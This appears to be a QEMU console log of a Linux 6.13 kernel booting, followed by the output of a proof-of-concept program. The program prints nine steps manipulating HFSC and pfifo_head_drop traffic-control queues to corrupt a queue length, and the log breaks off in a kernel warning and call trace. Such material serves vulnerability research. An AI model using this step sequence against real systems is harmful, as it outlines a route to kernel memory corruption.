bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004fce2c4
input_len: 0x0000000001b9501d
output: 0x0000000001000000
output_len: 0x0000000005ae8170
kernel_total_size: 0x0000000005830000
needed_size: 0x0000000005c00000
trampoline_32bit: 0x0000000000000000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000003220300).
[    0.000000] Linux version 6.13.0-09711-g5368a67307b3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Sun May 10 06:01:19 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: legacy bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000026] kvm-clock: using sched offset of 662613427 cycles
[    0.002496] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.009086] tsc: Detected 2995.198 MHz processor
[    0.012656] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.015756] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.020323] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.031505] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.033665] Using GB pages for direct mapping
[    0.035534] RAMDISK: [mem 0x7fe8e000-0x7ffdffff]
[    0.036901] ACPI: Early table checksum verification disabled
[    0.039746] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.042132] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.045292] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.047744] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.051117] ACPI: FACS 0x000000007FFE0000 000040
[    0.052484] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.056065] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.059277] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.062863] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.065747] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.067983] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.070891] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.073535] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.075598] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.079404] No NUMA configuration found
[    0.081459] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.083538] NODE_DATA(0) allocated [mem 0x7fe8a940-0x7fe8dfff]
[    0.085749] Zone ranges:
[    0.086541]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.089182]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.091146]   Normal   empty
[    0.092040] Movable zone start for each node
[    0.093827] Early memory node ranges
[    0.095117]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.098098]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.100437] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.105059] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.107372] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.182719] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.689619] kasan: KernelAddressSanitizer initialized
[    0.692189] ACPI: PM-Timer IO Port: 0x608
[    0.693920] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.696060] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.699105] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.703171] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.705137] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.707178] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.711119] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.714414] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.716845] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.718592] TSC deadline timer available
[    0.719769] CPU topo: Max. logical packages:   1
[    0.721149] CPU topo: Max. logical dies:       1
[    0.722771] CPU topo: Max. dies per package:   1
[    0.724498] CPU topo: Max. threads per core:   1
[    0.726017] CPU topo: Num. cores per package:     2
[    0.727564] CPU topo: Num. threads per package:   2
[    0.729777] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.732382] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.735390] kvm-guest: KVM setup pv remote TLB flush
[    0.736875] kvm-guest: setup PV sched yield
[    0.738405] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.741781] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.744149] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.747506] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.751533] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.753864] Booting paravirtualized kernel on KVM
[    0.755812] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.774177] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.785535] percpu: Embedded 68 pages/cpu s240856 r8192 d29480 u1048576
[    0.787550] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.790897] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.793885] random: crng init done
[    0.796232] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.800985] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.806858] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.809502] Fallback order for Node 0: 0 
[    0.809537] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.812234] Policy zone: DMA32
[    0.813001] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.814893] stackdepot: allocating hash table via alloc_large_system_hash
[    0.816604] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.901754] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.909409] Dynamic Preempt: voluntary
[    0.911996] rcu: Preemptible hierarchical RCU implementation.
[    0.913497] rcu: 	RCU event tracing is enabled.
[    0.915107] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.918196] 	Trampoline variant of Tasks RCU enabled.
[    0.919954] 	Tracing variant of Tasks RCU enabled.
[    0.921012] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.923654] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.925199] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.927139] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.945969] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.948104] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.960244] Console: colour VGA+ 80x25
[    0.961227] printk: legacy console [ttyS0] enabled
[    0.961227] printk: legacy console [ttyS0] enabled
[    0.963302] printk: legacy bootconsole [earlyser0] disabled
[    0.963302] printk: legacy bootconsole [earlyser0] disabled
[    0.966206] ACPI: Core revision 20240827
[    0.968497] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.971628] APIC: Switch to symmetric I/O mode setup
[    0.973474] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.978337] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.980621] kvm-guest: setup PV IPIs
[    0.983987] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.987006] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.991705] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    0.993969] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.995124] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.995696] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.996770] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.997744] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.999755] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    1.000697] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    1.001696] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    1.002699] RETBleed: Mitigation: Enhanced IBRS
[    1.003733] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    1.004782] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    1.005772] MMIO Stale Data: Unknown: No mitigations
[    1.006697] Register File Data Sampling: Vulnerable: No microcode
[    1.008732] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    1.009697] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    1.010696] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    1.011763] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    1.012696] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    1.044340] Freeing SMP alternatives memory: 48K
[    1.044921] pid_max: default: 32768 minimum: 301
[    1.046918] LSM: initializing lsm=capability,selinux
[    1.047789] SELinux:  Initializing.
[    1.049802] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    1.051843] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    1.056938] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    1.062024] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    1.062905] signal: max sigframe size: 1776
[    1.064791] rcu: Hierarchical SRCU implementation.
[    1.065700] rcu: 	Max phase no-delay instances is 400.
[    1.067905] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    1.070140] smp: Bringing up secondary CPUs ...
[    1.072906] smpboot: x86: Booting SMP configuration:
[    1.073752] .... node  #0, CPUs:      #1
[    1.075854] smp: Brought up 1 node, 2 CPUs
[    1.077742] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    1.081631] Memory: 1673072K/2096632K available (51329K kernel code, 8681K rwdata, 11268K rodata, 6056K init, 1352K bss, 418504K reserved, 0K cma-reserved)
[    1.084749] devtmpfs: initialized
[    1.092692] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.094781] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.097701] PM: RTC time: 06:02:49, date: 2026-05-10
[    1.100174] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.102404] audit: initializing netlink subsys (disabled)
[    1.105033] audit: type=2000 audit(1778392970.393:1): state=initialized audit_enabled=0 res=1
[    1.106839] thermal_sys: Registered thermal governor 'step_wise'
[    1.108021] cpuidle: using governor menu
[    1.114365] PCI: Using configuration type 1 for base access
[    1.115856] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.120140] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.120701] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.124596] ACPI: Added _OSI(Module Device)
[    1.124704] ACPI: Added _OSI(Processor Device)
[    1.125789] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.126732] ACPI: Added _OSI(Processor Aggregator Device)
[    1.142135] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.146514] ACPI: Interpreter enabled
[    1.147000] ACPI: PM: (supports S0 S3 S4 S5)
[    1.147712] ACPI: Using IOAPIC for interrupt routing
[    1.150297] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.150774] PCI: Using E820 reservations for host bridge windows
[    1.152732] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.171466] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.171736] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.172703] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.173802] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.174975] PCI host bridge to bus 0000:00
[    1.175753] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.176702] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.177700] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.178712] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.179709] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.180703] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.181789] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    1.189525] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    1.196316] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    1.197778] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    1.198784] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    1.199699] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    1.200700] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    1.201706] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    1.203096] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    1.204858] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.205727] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.207414] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    1.209800] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    1.210744] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    1.211769] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    1.214036] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.225302] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    1.226724] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    1.227729] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    1.228771] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    1.240527] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.242277] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.243477] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.244349] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.245008] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.249451] iommu: Default domain type: Translated
[    1.249702] iommu: DMA domain TLB invalidation policy: lazy mode
[    1.252285] SCSI subsystem initialized
[    1.254470] ACPI: bus type USB registered
[    1.255014] usbcore: registered new interface driver usbfs
[    1.255795] usbcore: registered new interface driver hub
[    1.256833] usbcore: registered new device driver usb
[    1.258070] pps_core: LinuxPPS API ver. 1 registered
[    1.258701] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.259768] PTP clock support registered
[    1.263092] Advanced Linux Sound Architecture Driver Initialized.
[    1.266471] NetLabel: Initializing
[    1.266702] NetLabel:  domain hash size = 128
[    1.267731] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.270853] NetLabel:  unlabeled traffic allowed by default
[    1.272986] PCI: Using ACPI for IRQ routing
[    1.274969] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.275692] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.275692] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.275766] vgaarb: loaded
[    1.278410] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.278701] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.282458] clocksource: Switched to clocksource kvm-clock
[    1.289600] VFS: Disk quotas dquot_6.6.0
[    1.291053] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.295721] pnp: PnP ACPI init
[    1.301240] pnp: PnP ACPI: found 6 devices
[    1.337777] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.341091] NET: Registered PF_INET protocol family
[    1.343564] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.348537] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.352502] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.357678] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.371642] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    1.375732] TCP: Hash tables configured (established 16384 bind 16384)
[    1.378550] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    1.382141] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    1.386024] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.395334] RPC: Registered named UNIX socket transport module.
[    1.396983] RPC: Registered udp transport module.
[    1.398536] RPC: Registered tcp transport module.
[    1.400075] RPC: Registered tcp-with-tls transport module.
[    1.401811] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.406309] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.408361] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.410437] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.412674] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    1.414759] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    1.417152] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.418875] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.420716] PCI: CLS 0 bytes, default 64
[    1.422580] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.423403] Unpacking initramfs...
[    1.424999] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    1.440544] Initialise system trusted keyrings
[    1.442971] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    1.446880] NFS: Registering the id_resolver key type
[    1.449985] Key type id_resolver registered
[    1.452291] Key type id_legacy registered
[    1.454894] 9p: Installing v9fs 9p2000 file system support
[    1.468858] Freeing initrd memory: 1352K
[    1.470284] Key type asymmetric registered
[    1.471853] Asymmetric key parser 'x509' registered
[    1.474661] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.477026] io scheduler mq-deadline registered
[    1.478669] io scheduler kyber registered
[    1.482100] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.485027] ACPI: button: Power Button [PWRF]
[    1.493411] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.498026] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.505851] Non-volatile memory driver v1.3
[    1.508328] Linux agpgart interface v0.103
[    1.514583] ACPI: bus type drm_connector registered
[    1.545794] loop: module loaded
[    1.551742] scsi host0: ata_piix
[    1.555309] scsi host1: ata_piix
[    1.556845] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    1.559259] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    1.567751] e100: Intel(R) PRO/100 Network Driver
[    1.570023] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.573732] e1000: Intel(R) PRO/1000 Network Driver
[    1.575748] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.720515] ata2: found unknown device (class 0)
[    1.723078] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.727583] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.744991] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.746866] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.757226] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    2.166112] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.531316] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.532955] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.534905] e1000e: Intel(R) PRO/1000 Network Driver
[    2.535890] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.537278] sky2: driver version 1.30
[    2.539954] usbcore: registered new interface driver usblp
[    2.541574] usbcore: registered new interface driver usb-storage
[    2.546270] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.549929] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.551337] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.554145] rtc_cmos 00:05: RTC can wake from S4
[    2.555714] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.562727] rtc_cmos 00:05: registered as rtc0
[    2.565032] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.574234] device-mapper: ioctl: 4.49.0-ioctl (2025-01-17) initialised: dm-devel@lists.linux.dev
[    2.576904] intel_pstate: CPU model not supported
[    2.578269] hid: raw HID events driver (C) Jiri Kosina
[    2.580234] usbcore: registered new interface driver usbhid
[    2.581844] usbhid: USB HID core driver
[    2.584757] Initializing XFRM netlink socket
[    2.587769] NET: Registered PF_INET6 protocol family
[    2.594461] Segment Routing with IPv6
[    2.595658] In-situ OAM (IOAM) with IPv6
[    2.597001] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.599554] NET: Registered PF_PACKET protocol family
[    2.601141] 9pnet: Installing 9P2000 support
[    2.603291] Key type dns_resolver registered
[    2.606143] IPI shorthand broadcast: enabled
[    2.629645] sched_clock: Marking stable (2596008540, 33061665)->(2788290942, -159220737)
[    2.632816] registered taskstats version 1
[    2.633950] Loading compiled-in X.509 certificates
[    2.649353] Demotion targets for Node 0: null
[    2.650906] PM:   Magic number: 10:340:13
[    2.652191] printk: legacy console [netcon0] enabled
[    2.653531] netconsole: network logging started
[    2.655153] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.657842] kworker/u8:1 (56) used greatest stack depth: 29648 bytes left
[    2.660115] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.661801] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    2.664299] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.666548] cfg80211: failed to load regulatory.db
[    2.667850] ALSA device list:
[    2.668694]   No soundcards found.
[    2.676784] Freeing unused kernel image (initmem) memory: 6056K
[    2.678110] Write protecting the kernel read-only data: 65536k
[    2.680400] Freeing unused kernel image (text/rodata gap) memory: 1916K
[    2.682499] Freeing unused kernel image (rodata/data gap) memory: 1020K
[    2.695624] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.697270] Run /init as init process
[    2.701095] mkdir (59) used greatest stack depth: 28896 bytes left
[    2.702953] mount (60) used greatest stack depth: 28328 bytes left
[    2.707212] mount (63) used greatest stack depth: 28304 bytes left

secb: rootfs ready
---- poc begin ----
[*] dummy v0 ifindex=3
[*] step1: NEWQDISC hfsc Qdisc_A=0x10000000 (root)
[*] step2: NEWQDISC pfifo_head_drop Qdisc_C=0x30000000 limit=0
[*] step3: send packet -> qlen invariant break
[*] step4: DELQDISC Qdisc_C -> Qdisc_A.qlen=-1
[*] step5: NEWTCLASS hfsc class_A=0x10000001 (HFSC_RSC, m1=1)
[*] step6: NEWQDISC hfsc Qdisc_B=0x20000000 (parent=class_A)
[*] step7: NEWQDISC pfifo_head_drop Qdisc_C limit=0 (parent=B)
[*] step8: CHANGEQDISC Qdisc_A defcls=class_A (route via class_A)
[*] step9: send packet -> Qdisc_C.qlen=1 Qdisc_B.qlen=0
[    2.737509] ------------[ cut here ]------------
[    2.738631] WARNING: CPU: 1 PID: 66 at net/sched/sch_api.c:808 qdisc_tree_reduce_backlog+0x370/0x4b0
[    2.740704] Modules linked in:
[    2.741344] CPU: 1 UID: 0 PID: 66 Comm: poc Not tainted 6.13.0-09711-g5368a67307b3-dirty #1
[    2.742574] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    2.744473] RIP: 0010:qdisc_tree_reduce_backlog+0x370/0x4b0
[    2.745449] Code: 10 e8 24 b2 ff ff 48 89 c3 48 85 c0 0f 85 7a fd ff ff 90 0f 0b 90 48 83 c4 20 5b 5d 41 5c 41 5d 41 5e 41 5f e9 71 ad d8 fd 90 <0f> 0b 90 e9 1f ff ff ff 48 89 cf e8 30 0e 1b fe e9 c9 fe ff ff e8
[    2.749273] RSP: 0018:ffffc900004075f0 EFLAGS: 00010246
[    2.750502] RAX: 0000000000000000 RBX: ffff88800a7fb000 RCX: ffff88800a7fb010
[    2.752512] RDX: 0000000000000000 RSI: 0000000020000000 RDI: ffff88800a7fb0a8
[    2.753911] RBP: dffffc0000000000 R08: 0000000000000000 R09: ffff88800a7fb198
[    2.755778] R10: ffff88800a7f80df R11: ffff88800a2ba8c0 R12: 0000000000000000
[    2.756976] R13: ffff88800a7dc000 R14: 0000000010000001 R15: 0000000000000000
[    2.758191] FS:  000000002ad32380(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000
[    2.759548] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.760634] CR2: 00007ffd95ed3790 CR3: 000000000a4f6002 CR4: 0000000000370ef0
[    2.761749] Call Trace:
[    2.762203]  <TASK>
[    2.762603]  ? __warn+0xcc/0x260
[    2.763154]  ? qdisc_tree_reduce_backlog+0x370/0x4b0
[    2.763966]  ? report_bug+0x261/0x2c0
[    2.764696]  ? handle_bug+0x54/0xa0
[    2.765714]  ? exc_invalid_op+0x17/0x50
[    2.766503]  ? asm_exc_invalid_op+0x1a/0x20
[    2.767348]  ? qdisc_tree_reduce_backlog+0x370/0x4b0
[    2.768118]  pfifo_tail_enqueue+0x3c6/0x4f0
[    2.768821]  hfsc_enqueue+0x5ff/0xe40
[    2.769565]  ? __pfx_hfsc_enqueue+0x10/0x10
